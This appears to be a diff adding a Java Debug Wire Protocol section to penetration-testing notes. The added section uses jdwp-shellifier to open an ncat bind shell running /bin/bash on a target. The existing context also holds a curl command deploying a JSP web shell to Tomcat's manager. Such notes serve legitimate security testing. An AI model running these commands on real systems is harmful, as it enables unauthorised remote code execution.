@@ -37,3 +37,13 @@ curl -T cmdjsp.war -u 'username:password' http://IP:PORT/manager/text/deploy?pat
 ```
 - **JSP** is a collection of technologies that helps software developers create dynamically generated web pages based on HTML, XML, SOAP, or other document types.
 - **WAR** is the extension of a file that packages a web application directory hierarchy in ZIP format and is short for Web Archive.
+
+### Java Debug Wire Protocol
+
+The **Java Debug Wire Protocol** is the protocol used for communication between a debugger and the Java virtual machine (VM) which it debugs (hereafter called the target VM)
+
+[jdwp-shellifier](https://github.com/IOActive/jdwp-shellifier) is a tool to gain remote code execution on actice JDWP service.
+
+```bash
+python ./jdwp-shellifier.py -t IP -p PORT --cmd "ncat -v -l -p 1234 -e /bin/bash"
+```
